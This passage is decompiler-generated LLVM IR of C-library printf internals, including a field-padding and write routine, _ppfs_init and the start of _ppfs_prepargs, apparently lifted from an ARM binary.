  %v2_24acc = add i32 %v0_24ac0, %v1_24b28
  br label %dec_label_pc_24c3c

dec_label_pc_24ad8:                               ; preds = %dec_label_pc_24a90
  %v1_24ad8 = add i32 %v1_24aa0, 1
  %v3_24adc = icmp ult i32 %v1_24ad8, %v1_24a8c
  br i1 %v3_24adc, label %dec_label_pc_24a90, label %dec_label_pc_24c50

dec_label_pc_24ae8:                               ; preds = %dec_label_pc_2495c
  %v0_24ae8 = load i32, i32* @sl, align 4
  store i32 %v0_24ae8, i32* @r8, align 4
  store i32 11, i32* @r6, align 4
  store i32 32, i32* @sb, align 4
  store i32 %v0_24ae8, i32* @r4, align 4
  br label %dec_label_pc_24af8

dec_label_pc_24af8thread-pre-split:               ; preds = %.thread85, %dec_label_pc_248ec, %dec_label_pc_249a4, %dec_label_pc_24a30
  %v1_24afc.pre = phi i32 [ %v1_24afc.pre205, %dec_label_pc_248ec ], [ %v1_24afc.pre.pre, %dec_label_pc_249a4 ], [ 1, %dec_label_pc_24a30 ], [ %v2_2486c, %.thread85 ]
  %v0_24afc.pre = phi i32 [ 0, %dec_label_pc_248ec ], [ %v0_24afc.pre.pre, %dec_label_pc_249a4 ], [ 0, %dec_label_pc_24a30 ], [ %v2_248e0, %.thread85 ]
  %stack_var_-336.3.ph = phi i32 [ %v0_24860, %dec_label_pc_248ec ], [ %v0_24790, %dec_label_pc_249a4 ], [ %v0_24790, %dec_label_pc_24a30 ], [ %v0_24860, %.thread85 ]
  %v0_24af8.pr = load i32, i32* @r6, align 4
  br label %dec_label_pc_24af8

dec_label_pc_24af8:                               ; preds = %dec_label_pc_24af8thread-pre-split, %dec_label_pc_24a20, %dec_label_pc_249d8, %dec_label_pc_24ae8
  %v1_24afc = phi i32 [ %v1_24afc.pre, %dec_label_pc_24af8thread-pre-split ], [ %storemerge97, %dec_label_pc_24a20 ], [ %v3_249e4, %dec_label_pc_249d8 ], [ %v6_24970, %dec_label_pc_24ae8 ]
  %v0_24afc = phi i32 [ %v0_24afc.pre, %dec_label_pc_24af8thread-pre-split ], [ 0, %dec_label_pc_24a20 ], [ 0, %dec_label_pc_249d8 ], [ %v0_24ae8, %dec_label_pc_24ae8 ]
  %v0_24b04 = phi i32 [ %v0_24af8.pr, %dec_label_pc_24af8thread-pre-split ], [ 11, %dec_label_pc_24a20 ], [ 11, %dec_label_pc_249d8 ], [ 11, %dec_label_pc_24ae8 ]
  %v0_24b44 = phi i32 [ %stack_var_-336.3.ph, %dec_label_pc_24af8thread-pre-split ], [ %v0_24790, %dec_label_pc_24a20 ], [ %v0_24790, %dec_label_pc_249d8 ], [ %v0_24790, %dec_label_pc_24ae8 ]
  %v7_24af8 = icmp eq i32 %v0_24b04, 11
  %v2_24afc = add i32 %v1_24afc, %v0_24afc
  br i1 %v7_24af8, label %dec_label_pc_24b14, label %bb173

bb173:                                            ; preds = %dec_label_pc_24af8
  %v7_24b0c = icmp sgt i32 %v0_24b04, 5
  %. = select i1 %v7_24b0c, i32 2, i32 1
  %v2_24b10 = add i32 %v2_24afc, %.
  br label %dec_label_pc_24b14

dec_label_pc_24b14:                               ; preds = %dec_label_pc_24af8, %bb173
  %v0_24b28 = phi i32 [ %v2_24afc, %dec_label_pc_24af8 ], [ %v2_24b10, %bb173 ]
  store i32 %tmp98, i32* %r2.global-to-local, align 4
  %v3_24b18 = icmp uge i32 %tmp98, %v0_24b28
  %v9_24b18 = icmp eq i32 %tmp98, %v0_24b28
  %v2_24b1c = xor i1 %v9_24b18, true
  %v3_24b1c = and i1 %v3_24b18, %v2_24b1c
  br i1 %v3_24b1c, label %bb174, label %bb175

bb174:                                            ; preds = %dec_label_pc_24b14
  %v2_24b18 = sub i32 %tmp98, %v0_24b28
  store i32 %v2_24b18, i32* @sl, align 4
  br label %bb175

bb175:                                            ; preds = %dec_label_pc_24b14, %bb174
  store i32 %v1_24b28, i32* %r2.global-to-local, align 4
  %v2_24b24 = xor i1 %v3_24b18, true
  %v3_24b24 = or i1 %v9_24b18, %v2_24b24
  br i1 %v3_24b24, label %bb176, label %._crit_edge

._crit_edge:                                      ; preds = %bb175
  %v1_24b2c.pre = load i32, i32* @sl, align 4
  br label %bb177

bb176:                                            ; preds = %bb175
  store i32 0, i32* @sl, align 4
  br label %bb177

bb177:                                            ; preds = %._crit_edge, %bb176
  %v2_24b3c = phi i32 [ %v1_24b2c.pre, %._crit_edge ], [ 0, %bb176 ]
  %v2_24b28 = add i32 %v0_24b28, %v1_24b28
  %v2_24b2c = add i32 %v2_24b28, %v2_24b3c
  %v0_24b38 = load i32, i32* @sb, align 4
  %v7_24b38 = icmp eq i32 %v0_24b38, 48
  br i1 %v7_24b38, label %bb178, label %.thread30

bb178:                                            ; preds = %bb177
  %v3_24b3c = add i32 %v2_24b3c, %v0_24afc
  store i32 %v3_24b3c, i32* @r8, align 4
  store i32 0, i32* @sl, align 4
  br label %.thread30

.thread30:                                        ; preds = %bb177, %bb178
  %v0_24b54 = phi i32 [ %v2_24b3c, %bb177 ], [ 0, %bb178 ]
  %v1_24b44 = and i32 %v0_24b44, 8
  store i32 %v1_24b44, i32* @r7, align 4
  %v2_24b44 = icmp eq i32 %v1_24b44, 0
  br i1 %v2_24b44, label %dec_label_pc_24b4c, label %dec_label_pc_24b68

dec_label_pc_24b4c:                               ; preds = %.thread30
  %v0_24b4c = load i32, i32* @fp, align 4
  store i32 %v0_24b4c, i32* %r0.global-to-local, align 4
  store i32 %v0_24b54, i32* %r2.global-to-local, align 4
  %v4_24b58 = call i32 @_charpad(i32 %v0_24b4c, i8 32, i32 %v0_24b54)
  store i32 %v4_24b58, i32* %r0.global-to-local, align 4
  %v1_24b5c = load i32, i32* @sl, align 4
  %v9_24b5c = icmp eq i32 %v4_24b58, %v1_24b5c
  br i1 %v9_24b5c, label %dec_label_pc_24b64, label %dec_label_pc_24c50

dec_label_pc_24b64:                               ; preds = %dec_label_pc_24b4c
  %v0_24b64 = load i32, i32* @r7, align 4
  store i32 %v0_24b64, i32* @sl, align 4
  %v0_24b70.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_24b68

dec_label_pc_24b68:                               ; preds = %.thread30, %dec_label_pc_24b64
  %v0_24b70 = phi i32 [ %v0_24b04, %.thread30 ], [ %v0_24b70.pre, %dec_label_pc_24b64 ]
  %v0_24b6c = load i32, i32* @fp, align 4
  %v2_24b70 = add i32 %v0_24b70, add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -39444)
  store i32 %v2_24b70, i32* %r0.global-to-local, align 4
  %v2_24b74 = inttoptr i32 %v2_24b70 to i8*
  %v3_24b74 = call i32 @__GI_fputs_unlocked(i8* %v2_24b74, i32 %v0_24b6c)
  %v0_24b78 = load i32, i32* @fp, align 4
  store i32 %v0_24b78, i32* %r0.global-to-local, align 4
  %v0_24b80 = load i32, i32* @r8, align 4
  store i32 %v0_24b80, i32* %r2.global-to-local, align 4
  %v4_24b84 = call i32 @_charpad(i32 %v0_24b78, i8 48, i32 %v0_24b80)
  store i32 %v4_24b84, i32* %r0.global-to-local, align 4
  %v1_24b88 = load i32, i32* @r8, align 4
  %v9_24b88 = icmp eq i32 %v4_24b84, %v1_24b88
  br i1 %v9_24b88, label %dec_label_pc_24b90, label %dec_label_pc_24c50

dec_label_pc_24b90:                               ; preds = %dec_label_pc_24b68
  %v3_24b90 = load i32, i32* %stack_var_-44, align 4
  %v2_24b94 = icmp eq i32 %v3_24b90, 0
  br i1 %v2_24b94, label %dec_label_pc_24b9c, label %dec_label_pc_24bc0

dec_label_pc_24b9c:                               ; preds = %dec_label_pc_24b90
  %v0_24b9c = load i32, i32* @r5, align 4
  %v2_24b9c = icmp eq i32 %v0_24b9c, 0
  br i1 %v2_24b9c, label %dec_label_pc_24c24, label %dec_label_pc_24ba4

dec_label_pc_24ba4:                               ; preds = %dec_label_pc_24b9c
  %v0_24ba4 = load i32, i32* @r4, align 4
  store i32 %v0_24ba4, i32* %r0.global-to-local, align 4
  %v0_24bac = load i32, i32* @fp, align 4
  store i32 %v0_24bac, i32* %r2.global-to-local, align 4
  %v3_24bb0 = inttoptr i32 %v0_24bac to i16*
  %v4_24bb0 = call i32 @__stdio_fwrite(i32 %v0_24ba4, i32 %v0_24b9c, i16* %v3_24bb0)
  store i32 %v4_24bb0, i32* %r0.global-to-local, align 4
  %v1_24bb4 = load i32, i32* @r5, align 4
  %v9_24bb4 = icmp eq i32 %v4_24bb0, %v1_24bb4
  br i1 %v9_24bb4, label %dec_label_pc_24c24, label %dec_label_pc_24c50

dec_label_pc_24bc0:                               ; preds = %dec_label_pc_24b90
  store i32 %v2_24a64, i32* @r6, align 4
  store i32 %v2_24960, i32* @r8, align 4
  store i32 %v2_2496c, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_24c10.pr = load i32, i32* @r5, align 4
  %v2_24c1041 = icmp eq i32 %v0_24c10.pr, 0
  store i32 %v2_24960, i32* @r1, align 4
  store i32 %v2_24a64, i32* @r0, align 4
  br i1 %v2_24c1041, label %dec_label_pc_24c24, label %dec_label_pc_24bd8

dec_label_pc_24bd8:                               ; preds = %dec_label_pc_24bc0, %dec_label_pc_24c0c
  %v1_24bdc = phi i32 [ %v2_24c0c, %dec_label_pc_24c0c ], [ %v0_24c10.pr, %dec_label_pc_24bc0 ]
  %v2_24bd8 = icmp ult i32 %v1_24bdc, 128
  %.v1_24bdc = select i1 %v2_24bd8, i32 %v1_24bdc, i32 128
  store i32 %.v1_24bdc, i32* %r2.global-to-local, align 4
  %v6_24be4 = call i32 @__GI_wcsrtombs(i32 %v2_24a64, i32 %v2_24960, i32 %.v1_24bdc, i32 %v2_2496c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_24be4, i32* @r4, align 4
  %v2_24be8 = icmp eq i32 %v6_24be4, 0
  store i32 %v6_24be4, i32* %r0.global-to-local, align 4
  br i1 %v2_24be8, label %dec_label_pc_24c0c, label %dec_label_pc_24bf4

dec_label_pc_24bf4:                               ; preds = %dec_label_pc_24bd8
  store i32 %v2_24a64, i32* %r0.global-to-local, align 4
  %v0_24bfc = load i32, i32* @fp, align 4
  store i32 %v0_24bfc, i32* %r2.global-to-local, align 4
  %v3_24c00 = inttoptr i32 %v0_24bfc to i16*
  %v4_24c00 = call i32 @__stdio_fwrite(i32 %v2_24a64, i32 %v6_24be4, i16* %v3_24c00)
  store i32 %v4_24c00, i32* %r0.global-to-local, align 4
  %v1_24c04 = load i32, i32* @r4, align 4
  %v9_24c04 = icmp eq i32 %v4_24c00, %v1_24c04
  br i1 %v9_24c04, label %dec_label_pc_24c0c, label %dec_label_pc_24c50

dec_label_pc_24c0c:                               ; preds = %dec_label_pc_24bf4, %dec_label_pc_24bd8
  %v0_24c0c = phi i32 [ %v4_24c00, %dec_label_pc_24bf4 ], [ 0, %dec_label_pc_24bd8 ]
  %v1_24c0c = load i32, i32* @r5, align 4
  %v2_24c0c = sub i32 %v1_24c0c, %v0_24c0c
  store i32 %v2_24c0c, i32* @r5, align 4
  %v2_24c10 = icmp eq i32 %v2_24c0c, 0
  store i32 %v2_24960, i32* @r1, align 4
  store i32 %v2_24a64, i32* @r0, align 4
  br i1 %v2_24c10, label %dec_label_pc_24c24, label %dec_label_pc_24bd8

dec_label_pc_24c24:                               ; preds = %dec_label_pc_24c0c, %dec_label_pc_24bc0, %dec_label_pc_24ba4, %dec_label_pc_24b9c
  %v0_24c24 = load i32, i32* @fp, align 4
  store i32 %v0_24c24, i32* %r0.global-to-local, align 4
  %v0_24c2c = load i32, i32* @sl, align 4
  store i32 %v0_24c2c, i32* %r2.global-to-local, align 4
  %v4_24c30 = call i32 @_charpad(i32 %v0_24c24, i8 32, i32 %v0_24c2c)
  store i32 %v4_24c30, i32* %r0.global-to-local, align 4
  %v1_24c34 = load i32, i32* @sl, align 4
  %v9_24c34 = icmp eq i32 %v4_24c30, %v1_24c34
  br i1 %v9_24c34, label %dec_label_pc_24c3c, label %dec_label_pc_24c50

dec_label_pc_24c3c:                               ; preds = %dec_label_pc_24c24, %dec_label_pc_24ac8, %dec_label_pc_24924, %dec_label_pc_24734
  %stack_var_-336.4 = phi i32 [ %v0_24790, %dec_label_pc_24734 ], [ %v0_24b44, %dec_label_pc_24c24 ], [ %v0_24790, %dec_label_pc_24ac8 ], [ %v0_24790, %dec_label_pc_24924 ]
  %stack_var_-356.3 = phi i32 [ %v1_24b28, %dec_label_pc_24734 ], [ %v2_24b2c, %dec_label_pc_24c24 ], [ %v2_24acc, %dec_label_pc_24ac8 ], [ %v2_24928, %dec_label_pc_24924 ]
  %v3_24c3c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_24c3c, i32* @r4, align 4
  store i32 %v3_24c3c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_2465c.outer

dec_label_pc_24c48:                               ; preds = %dec_label_pc_246b8
  %v1_24c48 = add i32 %v0_246c0, 2
  store i32 %v1_24c48, i32* @r4, align 4
  br label %dec_label_pc_2465c.outer36

dec_label_pc_24c50:                               ; preds = %dec_label_pc_24ad8, %dec_label_pc_2495c, %dec_label_pc_24c24, %dec_label_pc_24ba4, %dec_label_pc_24b68, %dec_label_pc_24b4c, %dec_label_pc_24aa0, %dec_label_pc_24984, %dec_label_pc_248fc, %bb142, %dec_label_pc_24bf4
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_24c58

dec_label_pc_24c58:                               ; preds = %dec_label_pc_246ac, %bb, %dec_label_pc_245f0, %dec_label_pc_24c50
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_245f0 ], [ -1, %dec_label_pc_24c50 ], [ %v1_24b28, %dec_label_pc_246ac ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v6_245a0, i32* @r5, align 4
  store i32 %v9_245a0, i32* @r6, align 4
  store i32 %v12_245a0, i32* @r7, align 4
  store i32 %v18_245a0, i32* @sb, align 4
  store i32 %v21_245a0, i32* @sl, align 4
  store i32 %v24_245a0, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_24c48, { 1, 0 }
  uselistorder i32 %v3_24c3c, { 1, 2, 0 }
  uselistorder i32 %v2_24c0c, { 1, 2, 0 }
  uselistorder i32 %v0_24b54, { 1, 0 }
  uselistorder i32 %v2_24b3c, { 2, 0, 1 }
  uselistorder i1 %v9_24b18, { 1, 0 }
  uselistorder i32 %v2_24afc, { 1, 0 }
  uselistorder i32 %v0_24b44, { 1, 0 }
  uselistorder i32 %v0_24afc, { 1, 0 }
  uselistorder i32 %v1_24ad8, { 1, 0 }
  uselistorder i32 %v1_24aa0, { 1, 0, 2 }
  uselistorder i32 %v3_24a70, { 1, 2, 0 }
  uselistorder i32 %v0_249dc, { 1, 0 }
  uselistorder i32 %v2_249cc, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_24994, { 1, 2, 0, 3 }
  uselistorder i32 %v3_2490c, { 1, 0 }
  uselistorder i32 %v2_2486c, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_24888, { 1, 2, 3, 0 }
  uselistorder i32 %v2_24808, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_24770, { 0, 2, 1, 3 }
  uselistorder i32 %v1_24714.pre, { 1, 0, 2 }
  uselistorder i32 %v1_2470c, { 1, 0 }
  uselistorder i32 %v1_246b8, { 0, 1, 3, 2 }
  uselistorder i32 %v1_24b28, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_24678, { 1, 0 }
  uselistorder i32 %v1_24670.lcssa, { 1, 0 }
  uselistorder i8 %v2_2465c, { 1, 0 }
  uselistorder i32 %v2_24670, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_24688, { 0, 1, 3, 2 }
  uselistorder i32 %v0_24790, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_24880, { 1, 0 }
  uselistorder i1 %v7_247d0, { 1, 2, 0 }
  uselistorder i1 %v7_249bc, { 1, 0 }
  uselistorder i1 %v7_24934, { 1, 0 }
  uselistorder i1 %v7_24810, { 1, 0 }
  uselistorder i32 %v2_2496c, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_24960, { 1, 2, 3, 0, 6, 4, 5, 7 }
  uselistorder i32 %v2_24a64, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_24710, { 1, 3, 2, 0 }
  uselistorder i32 %v4_246ec, { 1, 0 }
  uselistorder i32 %v2_245a8, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 21, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 0, 22, 23, 24, 26, 25, 3, 27, 28, 29, 30, 31, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 8, 6, 7, 10, 9, 11, 13, 12, 18, 14, 15, 16, 17, 19, 20, 23, 21, 22, 25, 24, 27, 26, 29, 28, 31, 30, 34, 32, 33, 37, 38, 35, 36, 39, 40, 1, 2, 42, 41, 44, 43, 46, 45, 48, 47, 0 }
  uselistorder i32 (i32, i8, i32)* @_charpad, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 add (i32 ptrtoint (i32* @global_var_44990.1184 to i32), i32 -132212), { 1, 0 }
  uselistorder label %dec_label_pc_24c58, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_24c50, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_24bd8, { 1, 0 }
  uselistorder label %dec_label_pc_24b68, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_24b14, { 1, 0 }
  uselistorder label %dec_label_pc_24af8, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_24af8thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_24a20, { 1, 0 }
  uselistorder label %dec_label_pc_249d8, { 1, 0 }
  uselistorder label %dec_label_pc_248ec, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_247c0, { 1, 0 }
  uselistorder label %dec_label_pc_247bc, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_24708, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_246ac, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_24678, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_2465c.outer36, { 1, 0 }
}

define i32 @_ppfs_init(i32* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %v3_24c88 = load i32, i32* @r4, align 4
  %v6_24c88 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_24c94 = load i32, i32* @r1, align 4
  store i32 %v0_24c94, i32* @r5, align 4
  store i32 0, i32* @r1, align 4
  %v0_24ca0 = call i32 @__GI_memset()
  store i32 %v0_24ca0, i32* %r0.global-to-local, align 4
  %v0_24ca4 = load i32, i32* @r4, align 4
  %v1_24ca4 = add i32 %v0_24ca4, 24
  %v2_24ca4 = inttoptr i32 %v1_24ca4 to i32*
  %v3_24ca4 = load i32, i32* %v2_24ca4, align 4
  store i32 %v3_24ca4, i32* %r3.global-to-local, align 4
  %v0_24ca8 = load i32, i32* @r5, align 4
  %v2_24ca8 = inttoptr i32 %v0_24ca4 to i32*
  store i32 %v0_24ca8, i32* %v2_24ca8, align 4
  %v0_24cac = load i32, i32* %r3.global-to-local, align 4
  %v1_24cac = add i32 %v0_24cac, -1
  %v1_24cb0 = load i32, i32* @r4, align 4
  %v2_24cb0 = add i32 %v1_24cb0, 24
  %v3_24cb0 = inttoptr i32 %v2_24cb0 to i32*
  store i32 %v1_24cac, i32* %v3_24cb0, align 4
  %v0_24cb4 = load i32, i32* @r4, align 4
  %v1_24cb4 = add i32 %v0_24cb4, 40
  store i32 %v1_24cb4, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_24cc421 = inttoptr i32 %v1_24cb4 to i32*
  store i32 8, i32* %v2_24cc421, align 4
  %v3_24cc422 = load i32, i32* %r2.global-to-local, align 4
  %v4_24cc423 = add i32 %v3_24cc422, 4
  store i32 %v4_24cc423, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_24cc0.dec_label_pc_24cc0_crit_edge

dec_label_pc_24cc0.dec_label_pc_24cc0_crit_edge:  ; preds = %entry, %dec_label_pc_24cc0.dec_label_pc_24cc0_crit_edge
  %v4_24cc424 = phi i32 [ %v4_24cc423, %entry ], [ %v4_24cc4, %dec_label_pc_24cc0.dec_label_pc_24cc0_crit_edge ]
  %v0_24cc0.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_24cc4.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_24cc0 = add i32 %v0_24cc0.pre, -1
  store i32 %v1_24cc0, i32* %r3.global-to-local, align 4
  %v7_24cc0 = icmp eq i32 %v0_24cc0.pre, 1
  %v2_24cc4 = inttoptr i32 %v4_24cc424 to i32*
  store i32 %v0_24cc4.pre, i32* %v2_24cc4, align 4
  %v3_24cc4 = load i32, i32* %r2.global-to-local, align 4
  %v4_24cc4 = add i32 %v3_24cc4, 4
  store i32 %v4_24cc4, i32* %r2.global-to-local, align 4
  br i1 %v7_24cc0, label %dec_label_pc_24ccc, label %dec_label_pc_24cc0.dec_label_pc_24cc0_crit_edge

dec_label_pc_24ccc:                               ; preds = %dec_label_pc_24cc0.dec_label_pc_24cc0_crit_edge
  %v0_24ccc = load i32, i32* @r5, align 4
  store i32 %v0_24ccc, i32* %r2.global-to-local, align 4
  %v1_24d0c2 = inttoptr i32 %v0_24ccc to i8*
  %v2_24d0c3 = load i8, i8* %v1_24d0c2, align 1
  %v3_24d0c4 = zext i8 %v2_24d0c3 to i32
  store i32 %v3_24d0c4, i32* %r0.global-to-local, align 4
  %v2_24d105 = icmp eq i8 %v2_24d0c3, 0
  br i1 %v2_24d105, label %dec_label_pc_24d18, label %dec_label_pc_24cd4

dec_label_pc_24cd4:                               ; preds = %dec_label_pc_24ccc, %dec_label_pc_24d0c.backedge
  %v0_24cdc = phi i32 [ %storemerge, %dec_label_pc_24d0c.backedge ], [ %v0_24ccc, %dec_label_pc_24ccc ]
  %v0_24cd4 = phi i32 [ %v3_24d0c, %dec_label_pc_24d0c.backedge ], [ %v3_24d0c4, %dec_label_pc_24ccc ]
  %v7_24cd4 = icmp eq i32 %v0_24cd4, 37
  br i1 %v7_24cd4, label %dec_label_pc_24cdc, label %dec_label_pc_24d08

dec_label_pc_24cdc:                               ; preds = %dec_label_pc_24cd4
  %v1_24cdc = add i32 %v0_24cdc, 1
  %v2_24cdc = inttoptr i32 %v1_24cdc to i8*
  %v3_24cdc = load i8, i8* %v2_24cdc, align 1
  %v4_24cdc = zext i8 %v3_24cdc to i32
  store i32 %v4_24cdc, i32* %r3.global-to-local, align 4
  store i32 %v1_24cdc, i32* %r2.global-to-local, align 4
  %v7_24ce0 = icmp eq i8 %v3_24cdc, 37
  br i1 %v7_24ce0, label %dec_label_pc_24d08, label %dec_label_pc_24ce8

dec_label_pc_24ce8:                               ; preds = %dec_label_pc_24cdc
  %v1_24ce8 = load i32, i32* @r4, align 4
  %v2_24ce8 = inttoptr i32 %v1_24ce8 to i32*
  store i32 %v1_24cdc, i32* %v2_24ce8, align 4
  %v0_24cec = load i32, i32* @r4, align 4
  store i32 %v0_24cec, i32* %r0.global-to-local, align 4
  %v1_24cf0 = inttoptr i32 %v0_24cec to i8*
  %v2_24cf0 = call i32 @_ppfs_parsespec(i8* %v1_24cf0)
  store i32 %v2_24cf0, i32* %r0.global-to-local, align 4
  %v1_24cf4 = icmp slt i32 %v2_24cf0, 0
  br i1 %v1_24cf4, label %dec_label_pc_24d1c.loopexit, label %dec_label_pc_24d00

dec_label_pc_24d00:                               ; preds = %dec_label_pc_24ce8
  %v0_24d00 = load i32, i32* @r4, align 4
  %v1_24d00 = inttoptr i32 %v0_24d00 to i32*
  %v2_24d00 = load i32, i32* %v1_24d00, align 4
  br label %dec_label_pc_24d0c.backedge

dec_label_pc_24d08:                               ; preds = %dec_label_pc_24cd4, %dec_label_pc_24cdc
  %v0_24d08 = phi i32 [ %v0_24cdc, %dec_label_pc_24cd4 ], [ %v1_24cdc, %dec_label_pc_24cdc ]
  %v1_24d08 = add i32 %v0_24d08, 1
  br label %dec_label_pc_24d0c.backedge

dec_label_pc_24d0c.backedge:                      ; preds = %dec_label_pc_24d08, %dec_label_pc_24d00
  %storemerge = phi i32 [ %v1_24d08, %dec_label_pc_24d08 ], [ %v2_24d00, %dec_label_pc_24d00 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_24d0c = inttoptr i32 %storemerge to i8*
  %v2_24d0c = load i8, i8* %v1_24d0c, align 1
  %v3_24d0c = zext i8 %v2_24d0c to i32
  store i32 %v3_24d0c, i32* %r0.global-to-local, align 4
  %v2_24d10 = icmp eq i8 %v2_24d0c, 0
  br i1 %v2_24d10, label %dec_label_pc_24d0c.dec_label_pc_24d18_crit_edge, label %dec_label_pc_24cd4

dec_label_pc_24d0c.dec_label_pc_24d18_crit_edge:  ; preds = %dec_label_pc_24d0c.backedge
  %v0_24d18.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_24d18

dec_label_pc_24d18:                               ; preds = %dec_label_pc_24d0c.dec_label_pc_24d18_crit_edge, %dec_label_pc_24ccc
  %v0_24d18 = phi i32 [ %v0_24d18.pre, %dec_label_pc_24d0c.dec_label_pc_24d18_crit_edge ], [ %v0_24ccc, %dec_label_pc_24ccc ]
  %v1_24d18 = load i32, i32* @r4, align 4
  %v2_24d18 = inttoptr i32 %v1_24d18 to i32*
  store i32 %v0_24d18, i32* %v2_24d18, align 4
  %v1_24d24.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24d1c

dec_label_pc_24d1c.loopexit:                      ; preds = %dec_label_pc_24ce8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_24d1c

dec_label_pc_24d1c:                               ; preds = %dec_label_pc_24d1c.loopexit, %dec_label_pc_24d18
  %v1_24d24 = phi i32 [ -1, %dec_label_pc_24d1c.loopexit ], [ %v1_24d24.pre, %dec_label_pc_24d18 ]
  store i32 %v3_24c88, i32* @r4, align 4
  store i32 %v6_24c88, i32* @r5, align 4
  ret i32 %v1_24d24

; uselistorder directives
  uselistorder i32 %v3_24d0c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_24ccc, { 1, 0, 2, 3 }
  uselistorder i32 %v4_24cc4, { 1, 0 }
  uselistorder i32 %v0_24cc0.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 3, 2, 0, 4, 5 }
  uselistorder i32* %r2.global-to-local, { 4, 1, 7, 3, 2, 0, 5, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 4, 5, 2, 0, 6 }
  uselistorder label %dec_label_pc_24d08, { 1, 0 }
  uselistorder label %dec_label_pc_24cd4, { 1, 0 }
  uselistorder label %dec_label_pc_24cc0.dec_label_pc_24cc0_crit_edge, { 1, 0 }
}

define i32 @_ppfs_prepargs(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_24d28 = load i32, i32* @r4, align 4
  store i32 %v3_24d28, i32* %stack_var_-12, align 4
  %v0_24d2c = load i32, i32* @r0, align 4
  %v1_24d2c = add i32 %v0_24d2c, 24
  %v2_24d2c = inttoptr i32 %v1_24d2c to i32*
  %v3_24d2c = load i32, i32* %v2_24d2c, align 4
  store i32 %v3_24d2c, i32* %r5.global-to-local, align 4
  store i32 %v0_24d2c, i32* @r4, align 4
  %v2_24d3c = add i32 %v0_24d2c, 76
  %v3_24d3c = inttoptr i32 %v2_24d3c to i32*
  store i32 %arg2, i32* %v3_24d3c, align 4
  %tmp5 = icmp slt i32 %v3_24d2c, 1
  br i1 %tmp5, label %dec_label_pc_24d60, label %dec_label_pc_24d44

